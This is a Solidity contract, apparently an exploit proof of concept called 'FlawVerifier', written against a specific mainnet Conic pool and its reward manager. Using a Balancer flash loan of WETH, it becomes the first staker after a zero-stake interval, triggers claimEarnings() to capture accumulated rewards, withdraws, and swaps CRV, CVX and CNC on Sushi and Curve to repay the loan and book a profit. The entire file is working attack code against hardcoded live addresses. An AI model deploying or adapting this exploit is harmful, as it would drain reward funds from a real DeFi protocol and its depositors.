// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);
}

interface ILpTokenStakerLike {
    function stake(uint256 amount, address conicPool) external;

    function getBalanceForPool(address conicPool) external view returns (uint256);

    function getUserBalanceForPool(address conicPool, address account) external view returns (uint256);
}

interface IControllerLike {
    function lpTokenStaker() external view returns (ILpTokenStakerLike);
}

interface IConicPoolLike {
    function controller() external view returns (IControllerLike);

    function rewardManager() external view returns (address);

    function pool() external view returns (address);

    function underlying() external view returns (IERC20Metadata);

    function lpToken() external view returns (IERC20);

    function deposit(uint256 underlyingAmount, uint256 minLpReceived, bool stake) external returns (uint256);

    function unstakeAndWithdraw(uint256 conicLpAmount, uint256 minUnderlyingReceived) external returns (uint256);
}

interface IRewardManagerLike {
    function pool() external view returns (address);

    function claimEarnings() external returns (uint256, uint256, uint256);
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface ICurvePoolV2Like {
    function exchange(uint256 i, uint256 j, uint256 dx, uint256 minDy, bool useEth, address receiver)
        external
        returns (uint256);
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IFlashLoanRecipient {
    address internal constant TARGET = 0xBb787d6243a8D450659E09ea6fD82F1C859691e9;

    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant CVX = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B;
    address internal constant CNC = 0x9aE380F0272E2162340a5bB646c354271c0F5cFC;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant CNC_ETH_POOL = 0x838af967537350D2C44ABB8c010E49E32673ab94;

    bytes4 internal constant REWARD_MANAGER_SELECTOR = bytes4(keccak256("rewardManager()"));
    bytes4 internal constant POOL_SELECTOR = bytes4(keccak256("pool()"));

    uint256 internal constant FLASH_WETH = 2 ether;

    bool internal _attempted;
    bool internal _usedFlashLoan;
    bool internal _profitAchieved;
    bool internal _hypothesisValidated;

    address internal _profitToken;
    uint256 internal _profitAmount;

    uint256 internal _startCrv;
    uint256 internal _startCvx;
    uint256 internal _startCnc;
    uint256 internal _startWeth;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_attempted) return;
        _attempted = true;

        (address pool, IRewardManagerLike rewardManager) = _resolvePoolAndRewardManager();
        if (pool == address(0) || address(rewardManager) == address(0)) return;

        IConicPoolLike conicPool = IConicPoolLike(pool);
        if (address(conicPool.underlying()) != WETH) return;

        ILpTokenStakerLike staker = conicPool.controller().lpTokenStaker();
        if (staker.getBalanceForPool(pool) != 0) {
            // F-001 requires a historical zero-stake interval. If the pool is currently
            // nonzero, taking a proportional share is a different exploit and is outside
            // this verifier's allowed causality.
            return;
        }

        _snapshotProfitBaselines();

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_WETH;

        // The flashloan only supplies temporary stake capital from a live public venue.
        // The exploit cause is unchanged: zero stake -> attacker becomes first staker ->
        // claimEarnings() triggers _accountCheckpoint()/poolCheckpoint() -> backlog is
        // attributed against the now-nonzero supply -> attacker claims and exits.
        try IBalancerVault(BALANCER_VAULT).flashLoan(this, tokens, amounts, abi.encode(pool, address(rewardManager))) {}
            catch {}
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        require(msg.sender == BALANCER_VAULT, "bad lender");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "bad loan");
        require(address(tokens[0]) == WETH, "bad token");

        _usedFlashLoan = true;

        (address pool, address rewardManagerAddr) = abi.decode(userData, (address, address));
        uint256 repaymentAmount = amounts[0] + feeAmounts[0];

        _runExploit(pool, IRewardManagerLike(rewardManagerAddr), amounts[0], repaymentAmount);

        _safeTransfer(WETH, BALANCER_VAULT, repaymentAmount);
        _finalizeProfit();
    }

    function _runExploit(address pool, IRewardManagerLike rewardManager, uint256 capitalAmount, uint256 repaymentAmount)
        internal
    {
        IConicPoolLike conicPool = IConicPoolLike(pool);
        ILpTokenStakerLike staker = conicPool.controller().lpTokenStaker();

        require(staker.getBalanceForPool(pool) == 0, "stake not zero");
        require(IERC20(WETH).balanceOf(address(this)) >= capitalAmount, "missing WETH");

        _forceApprove(WETH, pool, capitalAmount);

        // Deposit unstaked first so the pool-level staked supply remains zero until the
        // attacker explicitly becomes the first staker. This keeps the finding's order:
        // zero-stake backlog exists first, then the attacker introduces the first stake,
        // then claimEarnings() performs the vulnerable checkpoint.
        uint256 lpAmount = conicPool.deposit(capitalAmount, 0, false);
        require(lpAmount != 0, "no LP");
        require(staker.getBalanceForPool(pool) == 0, "unexpected staker supply");

        IERC20 lpToken = conicPool.lpToken();
        _forceApprove(address(lpToken), address(staker), lpAmount);
        staker.stake(lpAmount, pool);

        uint256 attackerStake = staker.getUserBalanceForPool(pool, address(this));
        require(attackerStake != 0, "stake missing");

        rewardManager.claimEarnings();

        attackerStake = staker.getUserBalanceForPool(pool, address(this));
        if (attackerStake != 0) {
            conicPool.unstakeAndWithdraw(attackerStake, 0);
        }

        if (IERC20(WETH).balanceOf(address(this)) < repaymentAmount) {
            _raiseWethForRepayment(repaymentAmount);
        }
        require(IERC20(WETH).balanceOf(address(this)) >= repaymentAmount, "repay shortfall");
    }

    function _raiseWethForRepayment(uint256 repaymentAmount) internal {
        if (IERC20(WETH).balanceOf(address(this)) >= repaymentAmount) return;

        uint256 crvBalance = IERC20(CRV).balanceOf(address(this));
        if (crvBalance != 0) {
            _swapOnSushiToWeth(CRV, crvBalance);
            if (IERC20(WETH).balanceOf(address(this)) >= repaymentAmount) return;
        }

        uint256 cvxBalance = IERC20(CVX).balanceOf(address(this));
        if (cvxBalance != 0) {
            _swapOnSushiToWeth(CVX, cvxBalance);
            if (IERC20(WETH).balanceOf(address(this)) >= repaymentAmount) return;
        }

        uint256 cncBalance = IERC20(CNC).balanceOf(address(this));
        if (cncBalance != 0) {
            _swapCncToWeth(cncBalance);
        }
    }

    function _swapOnSushiToWeth(address token, uint256 amountIn) internal {
        _forceApprove(token, SUSHI_ROUTER, amountIn);

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;

        IUniswapV2RouterLike(SUSHI_ROUTER).swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
    }

    function _swapCncToWeth(uint256 amountIn) internal {
        _forceApprove(CNC, CNC_ETH_POOL, amountIn);
        ICurvePoolV2Like(CNC_ETH_POOL).exchange(1, 0, amountIn, 0, false, address(this));
    }

    function _resolvePoolAndRewardManager() internal view returns (address pool, IRewardManagerLike rewardManager) {
        address rewardManagerAddr = _staticcallAddress(TARGET, REWARD_MANAGER_SELECTOR);
        if (rewardManagerAddr != address(0)) {
            return (TARGET, IRewardManagerLike(rewardManagerAddr));
        }

        pool = _staticcallAddress(TARGET, POOL_SELECTOR);
        if (pool != address(0)) {
            return (pool, IRewardManagerLike(TARGET));
        }
    }

    function _staticcallAddress(address target, bytes4 selector) internal view returns (address result) {
        (bool success, bytes memory returndata) = target.staticcall(abi.encodeWithSelector(selector));
        if (success && returndata.length >= 32) {
            result = abi.decode(returndata, (address));
        }
    }

    function _snapshotProfitBaselines() internal {
        _startCrv = IERC20(CRV).balanceOf(address(this));
        _startCvx = IERC20(CVX).balanceOf(address(this));
        _startCnc = IERC20(CNC).balanceOf(address(this));
        _startWeth = IERC20(WETH).balanceOf(address(this));
    }

    function _finalizeProfit() internal {
        uint256 crvProfit = IERC20(CRV).balanceOf(address(this)) - _startCrv;
        uint256 cvxProfit = IERC20(CVX).balanceOf(address(this)) - _startCvx;
        uint256 cncProfit = IERC20(CNC).balanceOf(address(this)) - _startCnc;
        uint256 wethProfit = IERC20(WETH).balanceOf(address(this)) - _startWeth;

        _profitToken = CRV;
        _profitAmount = crvProfit;

        if (cvxProfit > _profitAmount) {
            _profitToken = CVX;
            _profitAmount = cvxProfit;
        }
        if (cncProfit > _profitAmount) {
            _profitToken = CNC;
            _profitAmount = cncProfit;
        }
        if (wethProfit > _profitAmount) {
            _profitToken = WETH;
            _profitAmount = wethProfit;
        }

        _profitAchieved = _profitAmount != 0;
        _hypothesisValidated = _profitAchieved;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool success, bytes memory returndata) = token.call(data);
        require(success, "token call failed");
        if (returndata.length != 0) {
            require(abi.decode(returndata, (bool)), "token op failed");
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function profitAchieved() external view returns (bool) {
        return _profitAchieved;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPath() external view returns (string memory) {
        if (_usedFlashLoan) {
            return "historical zero-stake backlog -> temporary WETH stake via Balancer flashloan -> first stake after zero interval -> claimEarnings() / _accountCheckpoint() / poolCheckpoint() -> unstakeAndWithdraw -> deterministic flashloan repayment";
        }
        return "historical zero-stake backlog -> first stake after zero interval -> claimEarnings() / _accountCheckpoint() / poolCheckpoint() -> unstakeAndWithdraw";
    }
}
